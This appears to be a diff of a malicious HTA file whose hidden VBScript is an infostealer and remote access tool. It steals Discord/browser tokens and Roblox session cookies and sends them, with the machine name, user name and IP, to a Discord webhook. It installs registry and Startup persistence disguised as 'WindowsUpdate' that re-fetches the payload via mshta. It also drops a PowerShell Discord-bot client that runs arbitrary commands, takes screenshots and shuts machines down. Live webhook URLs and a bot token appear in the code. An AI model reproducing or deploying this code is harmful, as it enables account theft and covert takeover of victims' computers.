@@ -1,37 +1,24 @@
-
 <html>
 <head>
-<!-- This site is hosted on Netlify. Anyone can build and deploy a site
-     like this one for free: https://netlify.new/?utm_campaign=ai-legible&utm_source=comment&utm_medium=referral&utm_id=cb2b3e1f-2451-4656-b47c-8aa7471a525a
-     Netlify hosting facts for this site: static/SSR served via Netlify Edge. -->
-<meta name="hosting-provider" content="Netlify">
-<meta name="netlify-deploy" content="https://netlify.new/?utm_campaign=ai-legible&amp;utm_source=meta&amp;utm_medium=referral&amp;utm_id=cb2b3e1f-2451-4656-b47c-8aa7471a525a"><title>.</title>
+<title>.</title>
 <hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
 <script language="VBScript">
 window.resizeTo 0,0:window.moveTo -2000,-2000
 On Error Resume Next
-
 Dim sh, fso, WH, PC, USER
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
-
-' CHANGE THIS TO YOUR WEBHOOK URL
-WH = "https://discord.com/api/webhooks/1556860720715530360/NTFfdFr8FDom_3KRH9QPQ7OcRumPW7qsQ2x3d0T73SgJRNMQGnex1BoSAjXk1gArGGTG"
-
+WH = "https://discord.com/api/webhooks/1568851795470590064/RrYKVgks55HZfSahZGWe5ByKrB-ho-h8Sj9RNZSqNXN8E4NXhW2-5CqOpoFPp5gBe-hG"
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
-
-' TRACE
 Dim tf: tf = sh.ExpandEnvironmentStrings("%TEMP%") & "\trace.txt"
 Dim tr: Set tr = fso.CreateTextFile(tf, True): tr.Write "START:" & Now & vbCrLf: tr.Close: Set tr = Nothing
-
 Call GrabTokens
 Call IP
 Call GrabRoblox
 Call Persistence
-Call DropRAT
+Call DropClient
 window.close()
-
 Sub IP()
     Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
@@ -48,7 +35,6 @@ Sub IP()
     PostEmbed "Target", info, 3447003
     Set xh = Nothing
 End Sub
-
 Sub GrabRoblox()
     Dim paths(4)
     paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
@@ -77,7 +63,6 @@ Sub GrabRoblox()
     If Len(fp) = 0 Then Exit Sub
     raw = ReadFile(fp)
     If Len(raw) < 50 Then Exit Sub
-
     Dim cookie: cookie = ""
     If InStr(raw, "_|WARNING") > 0 Then cookie = raw
     If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
@@ -95,7 +80,6 @@ Sub GrabRoblox()
         Dim rp: rp = InStr(raw, ".ROBLOSECURITY") : cookie = Mid(raw, rp)
     End If
     If Len(cookie) = 0 Then cookie = raw
-
     cookie = Replace(cookie, vbCr, "")
     cookie = Replace(cookie, vbLf, "")
     cookie = Replace(cookie, vbTab, "")
@@ -105,62 +89,69 @@ Sub GrabRoblox()
     cookie = Trim(cookie)
     Dim warn: warn = InStr(cookie, "_|WARNING")
     If warn > 1 Then cookie = Mid(cookie, warn)
-
     PostEmbed "Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC, 65280
     PostFile "cookie.txt", cookie
 End Sub
-
-Sub DropRAT()
-    ' CHANGE THIS TO YOUR RAT URL
-    Dim dl : dl = "https://ia600108.us.archive.org/34/items/24242424_202607/OnlineDice.exe"
-    Dim op : op = sh.ExpandEnvironmentStrings("%TEMP%") & "\OnlineDice.exe"
-    
-    ' DOWNLOAD USING BITSADMIN
-    sh.Run "bitsadmin /transfer rdownload /download /priority high " & dl & " " & op, 0, True
-    
-    ' IF BITS FAILS - USE CURL
-    If Not fso.FileExists(op) Then
-        sh.Run "cmd /c curl -L -o """ & op & """ """ & dl & """", 0, True
-    End If
-    
-    ' IF CURL FAILS - USE POWERSHELL
-    If Not fso.FileExists(op) Then
-        sh.Run "powershell -Command ""$url='" & dl & "'; $out='" & op & "'; (New-Object Net.WebClient).DownloadFile($url,$out)""", 0, True
-    End If
-    
-    If fso.FileExists(op) Then
-        ' ADD TO STARTUP
-        Dim startup
-        startup = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\OnlineDice.exe"
-        fso.CopyFile op, startup, True
-        
-        ' REGISTRY PERSISTENCE
-        sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OnlineDice", op, "REG_SZ"
-        
-        ' RUN THE RAT
-        sh.Run op, 0, False
-    End If
-End Sub
-
 Sub Persistence()
-    Dim payload : payload = "mshta https://YOUR_NETLIFY_URL/system.hta"
+    Dim payload : payload = "mshta https://app-a77430ab4f86bba7.up.railway.app/system.hta"
     On Error Resume Next
-    
-    ' 1) Registry Run (HKCU)
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
-    
-    ' 2) Registry RunOnce (HKCU)
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
-    
-    ' 3) Startup folder VBS
     Dim sp : sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
     Dim sf : Set sf = fso.CreateTextFile(sp, True)
     sf.WriteLine "CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)).Run Chr(34)&""" & payload & """&Chr(34), 0, False"
     sf.Close
-    
     PostEmbed "PERSISTENCE", "3 startup methods installed", 65280
 End Sub
-
+Sub DropClient()
+    Dim ps1 : ps1 = "$BotToken = 'MTU2ODg1MjA0OTUyNzk3MTg0Mg.GwNg3_.Qy_v9XiVu8b5UB0IutWI4buAuZbIfpMyFpcT24'" & vbCrLf & _
+    "$Webhook = '" & WH & "'" & vbCrLf & _
+    "$ControlChannel = '1568851359044866119'" & vbCrLf & _
+    "$UuidFile = $env:TEMP + '\cid.txt'" & vbCrLf & _
+    "$NumFile = $env:TEMP + '\mynum.txt'" & vbCrLf & _
+    "if (Test-Path $UuidFile) { $uuid = (Get-Content $UuidFile -Raw).Trim() } else { $uuid = [guid]::NewGuid().ToString(); $uuid | Out-File $UuidFile -Encoding ascii }" & vbCrLf & _
+    "$pc = $env:COMPUTERNAME" & vbCrLf & _
+    "$user = $env:USERNAME" & vbCrLf & _
+    "try { $ip = (Invoke-RestMethod 'https://api.ipify.org' -UseBasicParsing) } catch { $ip = 'unknown' }" & vbCrLf & _
+    "function Post-Webhook($text) { $body = @{ content = $text } | ConvertTo-Json; try { Invoke-RestMethod -Uri $Webhook -Method Post -Body $body -ContentType 'application/json' -UseBasicParsing | Out-Null } catch {} }" & vbCrLf & _
+    "Post-Webhook ('NEW|' + $uuid + '|' + $pc + '|' + $user + '|' + $ip)" & vbCrLf & _
+    "function Get-Messages { $headers = @{ Authorization = 'Bot ' + $BotToken }; $url = 'https://discord.com/api/v10/channels/' + $ControlChannel + '/messages?limit=20'; try { return Invoke-RestMethod -Uri $url -Headers $headers -UseBasicParsing } catch { return @() } }" & vbCrLf & _
+    "function Upload-File($path, $filename) { $headers = @{ Authorization = 'Bot ' + $BotToken }; $boundary = [guid]::NewGuid().ToString(); $fileBytes = [System.IO.File]::ReadAllBytes($path); $enc = [System.Text.Encoding]::GetEncoding('iso-8859-1'); $body = '--' + $boundary + ""`r`nContent-Disposition: form-data; name=`""file`""; filename=`"" + $filename + ""`""`r`nContent-Type: application/octet-stream`r`n`r`n"" + $enc.GetString($fileBytes) + ""`r`n--"" + $boundary + '--'; try { Invoke-RestMethod -Uri ('https://discord.com/api/v10/channels/' + $ControlChannel + '/messages') -Method Post -Headers $headers -Body $body -ContentType ('multipart/form-data; boundary=' + $boundary) -UseBasicParsing | Out-Null } catch {} }" & vbCrLf & _
+    "Add-Type -AssemblyName System.Windows.Forms" & vbCrLf & _
+    "Add-Type -AssemblyName System.Drawing" & vbCrLf & _
+    "function Take-Screenshot { $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; $g = [System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size); $tmp = $env:TEMP + '\ss.png'; $bmp.Save($tmp, [System.Drawing.Imaging.ImageFormat]::Png); $g.Dispose(); $bmp.Dispose(); return $tmp }" & vbCrLf & _
+    "$runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'" & vbCrLf & _
+    "Set-ItemProperty -Path $runKey -Name 'WinUpdateClient' -Value ('powershell -NoP -W Hidden -ExecutionPolicy Bypass -File ""' + $PSCommandPath + '""')" & vbCrLf & _
+    "while ($true) {" & vbCrLf & _
+    "  $msgs = Get-Messages" & vbCrLf & _
+    "  foreach ($m in $msgs) {" & vbCrLf & _
+    "    if ($m.content -like '*Assigned #*' -and $m.content -like ('*' + $pc + '*')) { if ($m.content -match '#(\d+)') { $Matches[1] | Out-File $NumFile -Encoding ascii } }" & vbCrLf & _
+    "  }" & vbCrLf & _
+    "  $myNum = ''" & vbCrLf & _
+    "  if (Test-Path $NumFile) { $myNum = (Get-Content $NumFile -Raw).Trim() }" & vbCrLf & _
+    "  if ($myNum) {" & vbCrLf & _
+    "    foreach ($m in $msgs) {" & vbCrLf & _
+    "      if ($m.content -like ('CMD|' + $myNum + '|*')) {" & vbCrLf & _
+    "        $parts = $m.content -split '\|', 3" & vbCrLf & _
+    "        if ($parts.Length -ge 3) {" & vbCrLf & _
+    "          $cmd = $parts[2]" & vbCrLf & _
+    "          if ($cmd -eq 'screenshot') { $ss = Take-Screenshot; Upload-File $ss 'screenshot.png'; Remove-Item $ss -Force -ErrorAction SilentlyContinue }" & vbCrLf & _
+    "          elseif ($cmd -eq 'shutdown') { Stop-Computer -Force }" & vbCrLf & _
+    "          elseif ($cmd -eq 'restart') { Restart-Computer -Force }" & vbCrLf & _
+    "          elseif ($cmd -like 'cmd|*') { $c = $cmd.Substring(4); $out = cmd /c $c 2>&1 | Out-String; if ($out.Length -gt 1800) { $out = $out.Substring(0,1800) }; Post-Webhook ('OUT|' + $myNum + '|' + $out) }" & vbCrLf & _
+    "          elseif ($cmd -eq 'info') { Post-Webhook ('INFO|' + $myNum + '|' + $pc + '|' + $user + '|' + $ip + '|' + (Get-Date -Format 'yyyy-MM-dd HH:mm')) }" & vbCrLf & _
+    "        }" & vbCrLf & _
+    "      }" & vbCrLf & _
+    "    }" & vbCrLf & _
+    "  }" & vbCrLf & _
+    "  Start-Sleep -Seconds 8" & vbCrLf & _
+    "}"
+    Dim op : op = sh.ExpandEnvironmentStrings("%TEMP%") & "\winupdate.ps1"
+    Dim f : Set f = fso.CreateTextFile(op, True)
+    f.Write ps1
+    f.Close
+    sh.Run "powershell -NoP -W Hidden -Exec Bypass -File """ & op & """", 0, False
+End Sub
 Sub GrabTokens()
     PostEmbed "DEBUG", "Starting GrabTokens...", 16753920
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
@@ -179,14 +170,12 @@ Sub GrabTokens()
     End If
     Set xh = Nothing
     PostEmbed "DEBUG", "PS1 downloaded: " + CStr(Len(pc)) + " bytes", 65280
-    
     Dim psf: psf = TmpFile("steal.ps1")
     WriteFile psf, pc
     PostEmbed "DEBUG", "PS1 written. Running...", 16753920
     sh.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
     PostEmbed "DEBUG", "PowerShell finished", 65280
     fso.DeleteFile psf, True
-    
     Dim tf: tf = TmpFile("steal_result.txt")
     If Not fso.FileExists(tf) Then
         PostEmbed "DEBUG", "NO steal_result.txt found!", 16711680
@@ -196,7 +185,6 @@ Sub GrabTokens()
     Dim raw: raw = ReadFile(tf)
     fso.DeleteFile tf, True
     PostEmbed "DEBUG", "Results: " + CStr(Len(raw)) + " bytes", 16753920
-    
     If Len(raw) > 10 Then
         Dim lines: lines = Split(raw, vbCrLf)
         Dim l, count
@@ -230,11 +218,9 @@ Sub GrabTokens()
         PostEmbed "DEBUG", "Results too small: " + CStr(Len(raw)) + " chars", 16711680
     End If
 End Sub
-
 Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
 Sub WriteFile(path, content): Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing: End Sub
 Function ReadFile(path): ReadFile = "": Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing: End Function
-
 Sub PostEmbed(t, d, c)
     Dim DQ: DQ = Chr(34)
     Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
@@ -245,7 +231,6 @@ Sub PostEmbed(t, d, c)
     h.Send j
     Set h = Nothing
 End Sub
-
 Sub PostFile(fn, ct)
     Dim DQ: DQ = Chr(34)
     Dim b: b = Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 36)
@@ -257,7 +242,6 @@ Sub PostFile(fn, ct)
     h.Send bd
     Set h = Nothing
 End Sub
-
 Function DecryptDPAPI(b64)
     DecryptDPAPI = ""
     Dim inf: inf = TmpFile("dpi.txt")
@@ -273,7 +257,6 @@ Function DecryptDPAPI(b64)
     fso.DeleteFile psf, True
     fso.DeleteFile outf, True
 End Function
-
 Function Ej(s)
     Ej = s
     Ej = Replace(Ej, Chr(92), Chr(92) & Chr(92))
